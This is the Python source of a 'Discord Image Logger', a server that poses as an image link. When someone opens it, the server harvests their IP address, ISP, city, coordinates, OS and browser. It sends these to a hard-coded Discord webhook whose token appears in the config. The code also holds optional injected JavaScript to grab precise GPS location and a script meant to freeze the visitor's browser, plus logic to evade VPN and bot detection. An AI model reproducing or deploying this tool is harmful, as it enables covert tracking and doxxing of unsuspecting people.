# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1119120082031890523/tFPU40N3-apR6Fh3pdnIFtO-Cv3cRNdYaWxV0GpHC2VTGN7TPTh1Ums9mjaEjzwmsp2m",
    "image": "data:image/jpeg;base64,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" # You can also have a custom image by using a URL argument
    # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
